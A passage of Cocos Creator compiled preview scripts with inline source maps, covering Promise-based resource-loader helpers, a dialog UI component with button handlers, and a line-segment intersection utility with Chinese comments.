kJBQzdCO2lDQUFNO2dDQUNILE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQzs2QkFDZjt3QkFDTCxDQUFDLElBQUU7Z0JBQ1AsQ0FBQyxDQUFDLEVBQUM7OztDQUNOO0FBR0QsU0FBUyxZQUFZLENBQUMsR0FBVSxFQUFFLElBQXFCO0lBQ25ELElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQztJQUNkLEVBQUUsQ0FBQyxNQUFNLENBQUMsVUFBVSxDQUFDLFlBQVksQ0FBQyxHQUFHLEVBQUUsSUFBSSxFQUFFLElBQUksQ0FBQyxDQUFDO0lBQ25ELE9BQU8sSUFBSSxDQUFDO0FBQ2hCLENBQUM7QUFFRCxFQUFFLENBQUMsTUFBTSxDQUFDLFdBQVcsR0FBRyxNQUFNLENBQUM7QUFDL0IsRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLEdBQUcsT0FBTyxDQUFDO0FBQ2pDLEVBQUUsQ0FBQyxNQUFNLENBQUMsaUJBQWlCLEdBQUcsWUFBWSxDQUFDO0FBQzNDLEVBQUUsQ0FBQyxNQUFNLENBQUMsZUFBZSxHQUFHLFVBQVUsQ0FBQztBQUN2QyxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksR0FBRyxZQUFZLENBQUMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcbmFzeW5jIGZ1bmN0aW9uIGdldFJlcyh1cmw6IHN0cmluZywgdHlwZT86IEZ1bmN0aW9uKTpQcm9taXNle1xyXG4gICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICBsZXQgcmVzID0gY2MubG9hZGVyLmdldFJlcyh1cmwsIHR5cGUpO1xyXG4gICAgICAgIGlmKHJlcyA9PSBudWxsKXtcclxuICAgICAgICAgICAgbGV0IHJlcyA9IGF3YWl0IGxvYWRSZXModXJsLCB0eXBlKS5jYXRjaChmdW5jdGlvbiAoZXJyKSB7XHJcbiAgICAgICAgICAgICAgICByZWplY3QoZXJyKTtcclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIHJlc29sdmUocmVzKTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHJlc29sdmUocmVzKTtcclxuICAgICAgICB9XHJcbiAgICB9KTtcclxufVxyXG5cclxuYXN5bmMgZnVuY3Rpb24gbG9hZFJlcyguLi5hcmdzKTpQcm9taXNle1xyXG4gICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICBjYy5sb2FkZXIubG9hZFJlcyguLi5hcmdzLCBmdW5jdGlvbiAoZXJyLCByZXMpIHtcclxuICAgICAgICAgICAgaWYgKGVyciA9PSBudWxsKXtcclxuICAgICAgICAgICAgICAgIHJlc29sdmUocmVzKTtcclxuICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgIHJlamVjdChlcnIpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9KTtcclxufVxyXG5cclxuYXN5bmMgZnVuY3Rpb24gbG9hZFJlc0FycmF5KC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgIGNjLmxvYWRlci5sb2FkUmVzQXJyYXkoLi4uYXJncywgZnVuY3Rpb24gKGVyciwgcmVzKSB7XHJcbiAgICAgICAgICAgIGlmIChlcnIgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlKHJlcyk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICByZWplY3QoZXJyKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfSk7XHJcbn1cclxuXHJcbmFzeW5jIGZ1bmN0aW9uIGxvYWRSZXNEaXIoLi4uYXJncyk6UHJvbWlzZXtcclxuICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgY2MubG9hZGVyLmxvYWRSZXNEaXIoLi4uYXJncywgZnVuY3Rpb24gKGVycjogRXJyb3IsIHJlc291cmNlOiBhbnlbXSwgdXJsczogc3RyaW5nW10pIHtcclxuICAgICAgICAgICAgaWYgKGVyciA9PSBudWxsKXtcclxuICAgICAgICAgICAgICAgIHJlc29sdmUoW3Jlc291cmNlLCB1cmxzXSk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICByZWplY3QoZXJyKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfSk7XHJcbn1cclxuXHJcblxyXG5mdW5jdGlvbiBnZXRGaWxlTmFtZXMoZGlyOnN0cmluZywgdHlwZTogdHlwZW9mIGNjLkFzc2V0KTpBcnJheTxzdHJpbmc+e1xyXG4gICAgbGV0IHVybHMgPSBbXTtcclxuICAgIGNjLmxvYWRlci5fcmVzb3VyY2VzLmdldFV1aWRBcnJheShkaXIsIHR5cGUsIHVybHMpO1xyXG4gICAgcmV0dXJuIHVybHM7XHJcbn1cclxuXHJcbmNjLmxvYWRlci5nZXRSZXNBd2FpdCA9IGdldFJlcztcclxuY2MubG9hZGVyLmxvYWRSZXNBd2FpdCA9IGxvYWRSZXM7XHJcbmNjLmxvYWRlci5sb2FkUmVzQXJyYXlBd2FpdCA9IGxvYWRSZXNBcnJheTtcclxuY2MubG9hZGVyLmxvYWRSZXNEaXJBd2FpdCA9IGxvYWRSZXNEaXI7XHJcbmNjLmxvYWRlci5nZXRGaWxlTmFtZXMgPSBnZXRGaWxlTmFtZXM7XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/dialog/DialogMediator.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ab009p+inpJkbGNSmjoh5ux', 'DialogMediator');
// framework/dialog/DialogMediator.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var View_1 = require("../component/View");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var DialogMediator = /** @class */ (function (_super) {
    __extends(DialogMediator, _super);
    function DialogMediator() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.title = null;
        _this.content = null;
        _this.closeButtonNode = null;
        _this.closeButtonSrpite = null;
        _this.layoutOfLeftRight = null;
        /** 左边按钮 */
        _this.leftButtonNode = null;
        _this.leftButtonSprite = null;
        _this.layoutOfLeftButton = null;
        _this.iconNodeOfLeftButton = null;
        _this.iconSpriteOfLeftButton = null;
        _this.textNodeOfLeftButton = null;
        _this.textOfLeftButton = null;
        /** 右边按钮 **/
        _this.rightButtonNode = null;
        _this.rightButtonSprite = null;
        _this.layoutOfRightButton = null;
        _this.iconNodeOfRightButton = null;
        _this.iconSpriteOfRightButton = null;
        _this.textNodeOfRightButton = null;
        _this.textOfRightButton = null;
        return _this;
    }
    DialogMediator.prototype.onClickLeft = function (event, data) {
        View_1.default.executeClickSoundCommand(event, data);
        this.node.emit("clickButton", "left");
        this.node.destroy();
    };
    DialogMediator.prototype.onClickRight = function (event, data) {
        View_1.default.executeClickSoundCommand(event, data);
        this.node.emit("clickButton", "right");
        this.node.destroy();
    };
    DialogMediator.prototype.onClickClose = function (event, data) {
        View_1.default.executeClickSoundCommand(event, data);
        this.node.emit("clickButton", "close");
        this.node.destroy();
    };
    DialogMediator.dialogPrefabName = null;
    __decorate([
        property({ type: cc.RichText })
    ], DialogMediator.prototype, "title", void 0);
    __decorate([
        property({ type: cc.RichText })
    ], DialogMediator.prototype, "content", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "closeButtonNode", void 0);
    __decorate([
        property({ type: cc.Sprite })
    ], DialogMediator.prototype, "closeButtonSrpite", void 0);
    __decorate([
        property({ type: cc.Layout })
    ], DialogMediator.prototype, "layoutOfLeftRight", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "leftButtonNode", void 0);
    __decorate([
        property({ type: cc.Sprite })
    ], DialogMediator.prototype, "leftButtonSprite", void 0);
    __decorate([
        property({ type: cc.Layout })
    ], DialogMediator.prototype, "layoutOfLeftButton", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "iconNodeOfLeftButton", void 0);
    __decorate([
        property({ type: cc.Sprite })
    ], DialogMediator.prototype, "iconSpriteOfLeftButton", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "textNodeOfLeftButton", void 0);
    __decorate([
        property({ type: cc.RichText })
    ], DialogMediator.prototype, "textOfLeftButton", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "rightButtonNode", void 0);
    __decorate([
        property({ type: cc.Sprite })
    ], DialogMediator.prototype, "rightButtonSprite", void 0);
    __decorate([
        property({ type: cc.Layout })
    ], DialogMediator.prototype, "layoutOfRightButton", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "iconNodeOfRightButton", void 0);
    __decorate([
        property({ type: cc.Sprite })
    ], DialogMediator.prototype, "iconSpriteOfRightButton", void 0);
    __decorate([
        property({ type: cc.Node })
    ], DialogMediator.prototype, "textNodeOfRightButton", void 0);
    __decorate([
        property({ type: cc.RichText })
    ], DialogMediator.prototype, "textOfRightButton", void 0);
    DialogMediator = __decorate([
        ccclass
    ], DialogMediator);
    return DialogMediator;
}(cc.Component));
exports.default = DialogMediator;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZGlhbG9nL0RpYWxvZ01lZGlhdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUduRywwQ0FBcUM7QUFFL0IsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBNEMsa0NBQVk7SUFBeEQ7UUFBQSxxRUFpRkM7UUE1RUcsV0FBSyxHQUFnQixJQUFJLENBQUM7UUFHMUIsYUFBTyxHQUFnQixJQUFJLENBQUM7UUFHNUIscUJBQWUsR0FBVyxJQUFJLENBQUM7UUFHL0IsdUJBQWlCLEdBQWEsSUFBSSxDQUFDO1FBR25DLHVCQUFpQixHQUFhLElBQUksQ0FBQztRQUVuQyxXQUFXO1FBRVgsb0JBQWMsR0FBVyxJQUFJLENBQUM7UUFHOUIsc0JBQWdCLEdBQWEsSUFBSSxDQUFDO1FBR2xDLHdCQUFrQixHQUFhLElBQUksQ0FBQztRQUdwQywwQkFBb0IsR0FBVyxJQUFJLENBQUM7UUFHcEMsNEJBQXNCLEdBQWEsSUFBSSxDQUFDO1FBR3hDLDBCQUFvQixHQUFXLElBQUksQ0FBQztRQUdwQyxzQkFBZ0IsR0FBZSxJQUFJLENBQUM7UUFFcEMsWUFBWTtRQUVaLHFCQUFlLEdBQVcsSUFBSSxDQUFDO1FBRy9CLHVCQUFpQixHQUFhLElBQUksQ0FBQztRQUduQyx5QkFBbUIsR0FBYSxJQUFJLENBQUM7UUFHckMsMkJBQXFCLEdBQVcsSUFBSSxDQUFDO1FBR3JDLDZCQUF1QixHQUFhLElBQUksQ0FBQztRQUd6QywyQkFBcUIsR0FBVyxJQUFJLENBQUM7UUFHckMsdUJBQWlCLEdBQWUsSUFBSSxDQUFDOztJQW9CekMsQ0FB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QyxJQUFJLEVBQUMsRUFBRSxDQUFDLElBQUksRUFBQyxDQUFDO2lFQUNZO0lBR3JDO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxRQUFRLEVBQUMsQ0FBQzs2REFDUTtJQTdEcEIsY0FBYztRQURsQyxPQUFPO09BQ2EsY0FBYyxDQWlGbEM7SUFBRCxxQkFBQztDQWpGRCxBQWlGQyxDQWpGMkMsRUFBRSxDQUFDLFNBQVMsR0FpRnZEO2tCQWpGb0IsY0FBYyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmltcG9ydCBWaWV3IGZyb20gXCIuLi9jb21wb25lbnQvVmlld1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBEaWFsb2dNZWRpYXRvciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgc3RhdGljIGRpYWxvZ1ByZWZhYk5hbWU6c3RyaW5nID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuUmljaFRleHR9KVxyXG4gICAgdGl0bGU6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuUmljaFRleHR9KVxyXG4gICAgY29udGVudDogY2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5Ob2RlfSlcclxuICAgIGNsb3NlQnV0dG9uTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuU3ByaXRlfSlcclxuICAgIGNsb3NlQnV0dG9uU3JwaXRlOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLkxheW91dH0pXHJcbiAgICBsYXlvdXRPZkxlZnRSaWdodDpjYy5MYXlvdXQgPSBudWxsO1xyXG5cclxuICAgIC8qKiDlt6bovrnmjInpkq4gKi9cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5Ob2RlfSlcclxuICAgIGxlZnRCdXR0b25Ob2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5TcHJpdGV9KVxyXG4gICAgbGVmdEJ1dHRvblNwcml0ZTpjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5MYXlvdXR9KVxyXG4gICAgbGF5b3V0T2ZMZWZ0QnV0dG9uOmNjLkxheW91dCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLk5vZGV9KVxyXG4gICAgaWNvbk5vZGVPZkxlZnRCdXR0b246Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLlNwcml0ZX0pXHJcbiAgICBpY29uU3ByaXRlT2ZMZWZ0QnV0dG9uOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLk5vZGV9KVxyXG4gICAgdGV4dE5vZGVPZkxlZnRCdXR0b246Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLlJpY2hUZXh0fSlcclxuICAgIHRleHRPZkxlZnRCdXR0b246Y2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIC8qKiDlj7PovrnmjInpkq4gKiovXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuTm9kZX0pXHJcbiAgICByaWdodEJ1dHRvbk5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLlNwcml0ZX0pXHJcbiAgICByaWdodEJ1dHRvblNwcml0ZTpjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5MYXlvdXR9KVxyXG4gICAgbGF5b3V0T2ZSaWdodEJ1dHRvbjpjYy5MYXlvdXQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5Ob2RlfSlcclxuICAgIGljb25Ob2RlT2ZSaWdodEJ1dHRvbjpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuU3ByaXRlfSlcclxuICAgIGljb25TcHJpdGVPZlJpZ2h0QnV0dG9uOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHt0eXBlOmNjLk5vZGV9KVxyXG4gICAgdGV4dE5vZGVPZlJpZ2h0QnV0dG9uOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5SaWNoVGV4dH0pXHJcbiAgICB0ZXh0T2ZSaWdodEJ1dHRvbjpjYy5SaWNoVGV4dCA9IG51bGw7XHJcblxyXG4gICAgb25DbGlja0xlZnQoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIFZpZXcuZXhlY3V0ZUNsaWNrU291bmRDb21tYW5kKGV2ZW50LCBkYXRhKTtcclxuICAgICAgICB0aGlzLm5vZGUuZW1pdChcImNsaWNrQnV0dG9uXCIsIFwibGVmdFwiKTtcclxuICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tSaWdodChldmVudCwgZGF0YSl7XHJcbiAgICAgICAgVmlldy5leGVjdXRlQ2xpY2tTb3VuZENvbW1hbmQoZXZlbnQsIGRhdGEpO1xyXG4gICAgICAgIHRoaXMubm9kZS5lbWl0KFwiY2xpY2tCdXR0b25cIiwgXCJyaWdodFwiKTtcclxuICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tDbG9zZShldmVudCwgZGF0YSl7XHJcbiAgICAgICAgVmlldy5leGVjdXRlQ2xpY2tTb3VuZENvbW1hbmQoZXZlbnQsIGRhdGEpO1xyXG4gICAgICAgIHRoaXMubm9kZS5lbWl0KFwiY2xpY2tCdXR0b25cIiwgXCJjbG9zZVwiKTtcclxuICAgICAgICB0aGlzLm5vZGUuZGVzdHJveSgpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/ccIntersection.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '23610RKHSVPp7YUZOd5FJeH', 'ccIntersection');
// framework/extend/ccIntersection.ts

/**
 * 求线段相交的交点坐标
 * */
cc.Intersection.pLineIntersect = function (a, b, c, d, retP) {
    if ((a.x === b.x && a.y === b.y) || (c.x === d.x && c.y === d.y)) {
        return false;
    }
    // 三角形abc 面积的2倍
    var area_abc = (a.x - c.x) * (b.y - c.y) - (a.y - c.y) * (b.x - c.x);
    // 三角形abd 面积的2倍
    var area_abd = (a.x - d.x) * (b.y - d.y) - (a.y - d.y) * (b.x - d.x);
    // 面积符号相同则两点在线段同侧,不相交 (对点在线段上的情况,本例当作不相交处理);
    if (area_abc * area_abd >= 0) {
        return false;
    }
    // 三角形cda 面积的2倍
    var area_cda = (c.x - a.x) * (d.y - a.y) - (c.y - a.y) * (d.x - a.x);
    // 三角形cdb 面积的2倍
    // 注意: 这里有一个小优化.不需要再用公式计算面积,而是通过已知的三个面积加减得出.
    var area_cdb = area_cda + area_abc - area_abd;
    if (area_cda * area_cdb >= 0) {
        return false;
    }
    //计算交点坐标
    var t = area_cda / (area_abd - area_abc);
    var dx = t * (b.x - a.x), dy = t * (b.y - a.y);
    retP.x = a.x + dx;
    retP.y = a.y + dy;
    return true;
};
/**
 * 求线段与圆之间的交点坐标
 * */
cc.Intersection.pLineCircle = function (point1, point2, circle, out) {
    var t;
